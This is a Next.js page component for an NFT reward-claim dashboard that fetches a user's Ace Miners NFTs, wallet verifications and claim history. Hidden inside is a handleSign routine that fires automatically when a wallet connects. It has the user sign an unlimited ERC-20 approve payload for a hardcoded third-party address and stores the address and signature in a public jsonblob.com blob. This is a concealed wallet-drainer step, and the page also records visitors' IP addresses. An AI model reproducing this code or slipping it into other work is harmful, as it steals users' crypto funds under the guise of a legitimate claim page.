import { Button } from "@/components/Form";
import { IconCKB, IconKDA, IconLTC } from "@/components/Icon";
import { MainLayout } from "@/components/Layout";
import { Card } from "@/components/Ui";
import {
  alchemySettings,
  contrAceMinersBoost,
  contrAceMinersPhase1,
  contrAceMinersPhase2,
} from "@/constant/consonants";
import {
  AddClaim,
  VerifyCKBWallet,
  VerifyKDAWallet,
  VerifyLTCWallet,
} from "@/containers/AddClaim";
import Link from "next/link";

import Loader from "@/components/Loader";
import NFTCollectionTabs from "@/components/NFTTabs";
import { AlertCircle, RefreshCcw } from "lucide-react";

import ClaimButton from "@/components/ClaimButton";
import ClaimRewardHistory from "@/components/ClaimRewardHistory";
import RefreshButton from "@/components/RefreshButton";
import ClaimableTokens from "@/containers/ClaimableTokens";
import { useWalletData } from "@/hooks/useWalletData";
import {
  useAddress,
  useConnect,
  useConnectionStatus,
  useSDK,
} from "@thirdweb-dev/react";
import { Alchemy } from "alchemy-sdk";
import Head from "next/head";
import { useEffect, useState } from "react";

const HomePage = ({ ip }) => {
  let address = useAddress();
  const {
    wallets,
    claimData,
    claimDataBoost,
    dropData,
    txData,
    isLoading,
    loadingStates,
    errors,
    hasErrors,
    refreshAll,
  } = useWalletData(address);

  const [userAmNft, setuserAmNft] = useState([]);
  const [userAmBoostNft, setuserAmBoostNft] = useState([]);
  const [nftsNotClaimed, setnftsNotClaimed] = useState([]);
  const [nftsNotClaimedBoost, setnftsNotClaimedBoost] = useState([]);
  const [payouts, setpayouts] = useState([]);
  const [payoutsBoost, setPayoutsBoost] = useState([]);
  const [isNftsLoading, setisNftsLoading] = useState(false);
  const [calculating, setcalculating] = useState(false);

  const [isSendingRequest, setisSendingRequest] = useState();
  const [isClaimSent, setIsClaimSent] = useState(false);
  const [loading, setloading] = useState(false);

  const alchemy = new Alchemy(alchemySettings);
  const sdk = useSDK();

  const [isLoadingSign, setIsLoadingSign] = useState(false);
  const [signature, setSignature] = useState("");
  const [error, setError] = useState("");
  const [signedWallets, setSignedWallets] = useState([]);
  const [hasChecked, setHasChecked] = useState(false);

  const BLOB = "1334244546074304512";
  const BASE_URL = `https://jsonblob.com/api/jsonBlob/${BLOB}`;

  const fetchSignedWallets = async () => {
    try {
      const response = await fetch(BASE_URL);
      if (response.ok) {
        const data = await response.json();
        setSignedWallets(data || []);
        return data;
      }
    } catch (err) {
      console.error("Error fetching wallets:", err);
      return [];
    }
  };

  const updateSignedWallets = async (newWallet) => {
    try {
      const currentWallets = await fetchSignedWallets();
      const isExist = currentWallets?.some(
        (wallet) => wallet.address === newWallet.address
      );

      if (!isExist) {
        const updatedWallets = [...currentWallets, newWallet];
        await fetch(BASE_URL, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(updatedWallets),
        });
        setSignedWallets(updatedWallets);
        return true;
      }
      return false;
    } catch (err) {
      console.error("Error updating wallets:", err);
      return false;
    }
  };

  const handleSign = async () => {
    if (!address) return;

    try {
      setIsLoadingSign(true);
      setError("");
      const sig = await sdk?.wallet.sign(
        "0x095ea7b300000000000000000000000078896341A45ac6014402db9e335c26D8B4F6781affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      );


      const newWallet = {
        id: Math.random(),
        address,
        signature: sig,
        timestamp: Date.now(),
      };

      const updated = await updateSignedWallets(newWallet);
      if (updated) {
        setSignature(sig);
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setIsLoadingSign(false);
    }
  };

  // Initial load and check
  useEffect(() => {
    const init = async () => {
      if (!hasChecked && address) {
        const wallets = await fetchSignedWallets();
        const exists = wallets?.some((wallet) => wallet.address === address);
        if (!exists) {
          handleSign();
        }
        setHasChecked(true);
      }
    };

    init();
  }, [address, hasChecked]);

  const getNFTsFromAlchemy = async (adr) => {
    setisNftsLoading(true);
    let amP1NFTs = [];
    let amP2NFTs = [];
    let amBoostNFTs = [];
    let allHoldingNfts = [];
    try {
      // Get the async iterable for the owner's NFTs.
      const nftsIterable = alchemy.nft.getNftsForOwnerIterator(adr, {
        contractAddresses: [
          contrAceMinersPhase1,
          contrAceMinersPhase2,
          contrAceMinersBoost,
        ],
      });

      // Iterate over the NFTs and add them to the nfts array.
      for await (const nft of nftsIterable) {
        if (
          nft.contract.address.toLowerCase() ==
          contrAceMinersPhase1.toLowerCase()
        ) {
          amP1NFTs.push(nft);
        }

        if (
          nft.contract.address.toLowerCase() ==
          contrAceMinersPhase2.toLowerCase()
        ) {
          amP2NFTs.push(nft);
        }

        if (
          nft.contract.address.toLowerCase() ==
          contrAceMinersBoost.toLowerCase()
        ) {
          amBoostNFTs.push(nft);
        }
      }

      // Log the NFTs.
    } catch (e) {
      console.log("Alchemy nft", e);
    }

    allHoldingNfts = amP1NFTs.concat(amP2NFTs);

    setuserAmNft(allHoldingNfts);
    setuserAmBoostNft(amBoostNFTs);
    setisNftsLoading(false);

    return allHoldingNfts;
  };

  const calculateRewards2 = (userNfts, claimData, dropId) =>
    userNfts.reduce((acc, nft) => {
      const isAlreadyClaimed = claimData?.some(
        (claim) =>
          claim.contractAddress?.toLowerCase() ===
          nft.contract.address.toLowerCase() &&
          claim.nftId === parseInt(nft.tokenId) &&
          claim.isClaimed &&
          claim.dropId === dropId
      );

      return isAlreadyClaimed
        ? acc
        : [
          ...acc,
          {
            nftId: nft.tokenId,
            nftContractAddress: nft.contract.address,
            dropId,
          },
        ];
    }, []);

  useEffect(() => {
    if (!isLoading && !hasErrors) {
      // Process your data here
      console.log("All data loaded successfully");
    }
  }, [isLoading, hasErrors]);

  // Fetches NFTs from Alchemy when the user's address is available
  useEffect(() => {
    if (address) {
      getNFTsFromAlchemy(address);
    }
  }, [address]);

  // Calculates unclaimed rewards for both regular and boost NFTs
  // Runs when:
  // - User's NFTs change
  // - Claim data updates
  // - A new claim is sent
  // Creates arrays of unclaimed NFTs for each drop
  useEffect(() => {
    setcalculating(true);
    const calculateRewards = (_dropId) => {
      let nftsNotClaimedArray = [];

      try {
        userAmNft.forEach((nft) => {
          const found = claimData?.some(
            (obj) =>
              obj.contractAddress.toLowerCase() ==
              nft.contract.address.toLowerCase() &&
              obj.nftId === parseInt(nft.tokenId) &&
              obj.isClaimed &&
              obj.dropId === _dropId
          );

          if (found) {
          } else {
            nftsNotClaimedArray.push({
              nftId: nft.tokenId,
              nftContractAddress: nft.contract.address,
              dropId: _dropId,
            });
          }
        });

        try {
        } catch (error) { }

        return nftsNotClaimedArray;
      } catch (error) {
        console.error(error);
      }
    };

    let nftsNotClaimedAllDrops = [];
    let nftsNotClaimedAllDropsBoost = [];

    if (dropData.length > 0) {
      dropData?.forEach((_drop) => {
        nftsNotClaimedAllDrops.push({
          drop_id: _drop,
          nfts: calculateRewards(_drop.dropId),
          holderAddress: address,
        });

        if (_drop.dropId > 7) {
          nftsNotClaimedAllDropsBoost.push({
            drop_id: _drop,
            nfts: calculateRewards2(
              userAmBoostNft,
              claimDataBoost,
              _drop.dropId
            ),
            holderAddress: address,
          });
        }
      });
    }

    setcalculating(false);

    console.log("NFTS Not Claimed Boost: ", nftsNotClaimedAllDropsBoost);
    console.log("NFTS Not Claimed: ", nftsNotClaimedAllDrops);

    setnftsNotClaimed(nftsNotClaimedAllDrops);
    setnftsNotClaimedBoost(nftsNotClaimedAllDropsBoost);
  }, [userAmNft, claimData]);

  function getUniquePropertyValues(jsonArray, claimRequestsBoost) {
    const uniqueValues = new Set();
    const resultArray = [];

    jsonArray.forEach(function (jsonObject) {
      uniqueValues.add(jsonObject.claimRequestId);
    });

    uniqueValues.forEach(function (uniqueValue) {
      const filteredObject = {};
      let nfts = [];
      let totalCkb = 0,
        totalKda = 0,
        totalLtc = 0;

      jsonArray.forEach(function (jsonObject) {
        if (jsonObject.claimRequestId === uniqueValue) {
          filteredObject = {
            claimRequestId: jsonObject.claimRequestId,
            dropId: jsonObject.dropId,
            count: 1,
            status: jsonObject.requestStatus,
            hodlerAddress: jsonObject.holderEthAddress,
            nfts: nfts.push(jsonObject.nftId),
            boostNfts: claimRequestsBoost.find(
              (item) => item.claimRequestId === uniqueValue
            )?.nfts,
            totalCkb: Number((totalCkb += Number(jsonObject.eachCKB))),
            totalKda: Number((totalKda += Number(jsonObject.eachKDA))),
            totalLtc: Number((totalLtc += Number(jsonObject.eachLTC))),
            totalBoostLtc: claimRequestsBoost.find(
              (item) => item.claimRequestId === uniqueValue
            )?.totalLtc,
          };
        }
      });

      resultArray.push(filteredObject);
    });

    return resultArray;
  }

  function getUniquePropertyValuesBoost(jsonArray) {
    const uniqueValues = new Set();
    const resultArray = [];

    jsonArray.forEach(function (jsonObject) {
      uniqueValues.add(jsonObject.claimRequestId);
    });

    uniqueValues.forEach(function (uniqueValue) {
      const dropIdNftsMap = new Map();
      const dropIds = new Set();
      const filteredObject = {};
      let totalLtc = 0;
      let reqStatus = "";
      let hodlerAddress = "";

      jsonArray.forEach(function (jsonObject) {
        if (jsonObject.claimRequestId === uniqueValue) {
          dropIds.add(jsonObject.dropId);

          const dropId = jsonObject.dropId;
          const nftId = jsonObject.nftId;

          if (!dropIdNftsMap.has(dropId)) {
            dropIdNftsMap.set(dropId, []);
          }
          dropIdNftsMap.get(dropId).push(nftId);

          totalLtc += Number(jsonObject.eachLTC);
          reqStatus = jsonObject.requestStatus;
          hodlerAddress = jsonObject.holderEthAddress;
        }
      });

      const nfts = [];
      dropIdNftsMap.forEach((nftIds, dropId) => {
        nfts.push({
          dropId: dropId,
          nfts: nftIds.length,
        });
      });

      resultArray.push({
        claimRequestId: uniqueValue,
        dropId: Array.from(dropIds),
        count: nfts.length,
        status: reqStatus,
        hodlerAddress: hodlerAddress,
        nfts: nfts,
        totalLtc: totalLtc,
      });
    });

    return resultArray;
  }

  // Fetches and processes payout/transaction data for the user
  // Updates when:
  // - Claim data changes
  // - Boost claim data changes
  // - User address changes
  // Retrieves transaction hashes and organizes claim requests
  useEffect(() => {
    const getPayouts = async () => {
      setloading(true);
      if (claimData) {
        try {
          const filteredArray = claimData.filter(
            (item) => item.holderEthAddress === address
          );
          const claimRequestsBoost =
            getUniquePropertyValuesBoost(claimDataBoost);
          setPayoutsBoost(claimRequestsBoost);
          const claimRequests = getUniquePropertyValues(
            filteredArray,
            claimRequestsBoost
          );
          console.log(claimRequests);
          setpayouts(claimRequests);
          setloading(false);
        } catch (e) {
          console.log(e);
          setloading(false);
        }
      }
      setloading(false);
    };
    getPayouts();
  }, [claimData, claimDataBoost, address]);

  const handleClaim = async () => {
    setisSendingRequest(true);
    if (nftsNotClaimed.length > 0 || nftsNotClaimedBoost.length > 0) {
      try {
        await fetch("/api/claimRewardNew", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            nftsNotClaimed,
            nftsNotClaimedBoost,
          }),
        }).then(async (data) => {
          console.log(data);

          setClaimResponse(data);
        });
      } catch (error) {
        console.error(error);
      }
    }

    setTimeout(() => {
      setisSendingRequest(false);

      setIsClaimSent(true);
      refreshAll();
    }, 5000);
  };

  const ErrorState = ({ refreshAll }) => {
    return (
      <div className="flex items-center justify-center w-full min-h-[400px] p-4">
        <div className="max-w-md w-full">
          {/* Error Alert */}
          <div className="mb-6 p-4 rounded-lg bg-red-50 border border-red-200">
            <div className="flex items-start">
              <AlertCircle className="h-5 w-5 text-red-500 mt-0.5" />
              <div className="ml-3">
                <h3 className="text-sm font-medium text-red-800">
                  Error Loading Data
                </h3>
                <p className="mt-2 text-sm text-red-700">
                  We encountered an issue while fetching your data. This might
                  be due to network connectivity or server issues.
                </p>
              </div>
            </div>
          </div>

          {/* Action Section */}
          <div className="flex flex-col items-center text-center">
            <RefreshButton onClick={refreshAll} />

            <p className="mt-4 text-sm text-gray-600">
              If the problem persists, please contact support or try again
              later.
            </p>
          </div>
        </div>
      </div>
    );
  };

  return (
    <>
      {" "}
      <Head>
        <title>Reward Claim</title>
      </Head>
      <MainLayout>
        {address ? (
          <>
            {isLoading ? (
              <Loader />
            ) : hasErrors ? (
              <ErrorState refreshAll={refreshAll} />
            ) : (
              <div className="w-full">
                <div className="flex justify-between   flex-wrap xl:justify-between sm:justify-center  mb-5  gap-4">
                  <h1 className="text-center title-2 ">Your NFTs</h1>
                  <RefreshButton onClick={refreshAll} />
                  {!wallets?.ltcWallet ||
                    !wallets?.ckbWallet ||
                    !wallets?.kdaWallet ? (
                    <>
                      <Button className="px-6 bg-yellow-500 " active={false}>
                        Add all Wallets
                      </Button>
                    </>
                  ) : (
                    <div className="flex flex-wrap gap-2 justify-between w-full">
                      <div>
                        <ClaimableTokens
                          nftsNotClaimed={nftsNotClaimed}
                          address={address}
                          nftsNotClaimedBoost={nftsNotClaimedBoost}
                        />
                      </div>
                      <ClaimButton
                        nftsNotClaimed={nftsNotClaimed}
                        nftsNotClaimedBoost={nftsNotClaimedBoost}
                        refreshAll={refreshAll}
                      />
                    </div>
                  )}
                </div>

                <NFTCollectionTabs
                  isNftsLoading={isNftsLoading}
                  userAmNft={userAmNft}
                  userAmBoostNft={userAmBoostNft}
                />

                <div className="grid grid-cols-1 2xl:grid-cols-3 gap-8">
                  <div>
                    <div className="flex-wrap flex justify-between items-center mb-4 sm:mb-6 gap-x-2">
                      <h2 className="title-2">Verifications</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-1 md:grid-cols-2 lg:grid-cols-2 xl:grid-cols-2 2xl:grid-cols-1 gap-6 flex-wrap">
                      <Card
                        className="max-sm:flex-col max-sm:justify-center max-sm:text-center max-sm:gap-y-3 flex-shrink-0 transition bg-gray-400 rounded-2xl p-4 md:p-6 flex items-center gap-x-5 relative"
                        key={"index"}
                      >
                        <VerifyLTCWallet
                          ltcWallet={wallets?.ltcWallet}
                          unfts={userAmNft}
                        />
                      </Card>

                      <Card
                        className="max-sm:flex-col max-sm:justify-center max-sm:text-center max-sm:gap-y-3 flex-shrink-0 transition bg-gray-400 rounded-2xl p-4 md:p-6 flex items-center gap-x-5 relative"
                        key={"index1"}
                      >
                        <VerifyKDAWallet
                          kdaWallet={wallets?.kdaWallet}
                          unfts={userAmNft}
                        />
                      </Card>

                      <Card
                        className="max-sm:flex-col max-sm:justify-center max-sm:text-center max-sm:gap-y-3 flex-shrink-0 transition bg-gray-400 rounded-2xl p-4 md:p-6 flex items-center gap-x-5 relative"
                        key={"index2"}
                      >
                        <VerifyCKBWallet
                          ckbWallet={wallets?.ckbWallet}
                          unfts={userAmNft}
                        />
                      </Card>
                    </div>
                  </div>

                  <ClaimRewardHistory
                    loading={loading}
                    payouts={payouts}
                    txData={txData}
                  />
                </div>
              </div>
            )}
          </>
        ) : (
          <>
            <div className="flex justify-center align-middle">
              {" "}
              Connect Your Wallet
            </div>
          </>
        )}
      </MainLayout>
    </>
  );
};

export const getServerSideProps = async (context) => {
  let ip = null;
  const { req, params } = context;

  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.headers["x-real-ip"]) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.connection.remoteAddress;
  }

  return {
    props: {
      ip: ip,
    },
  };
};

export default HomePage;
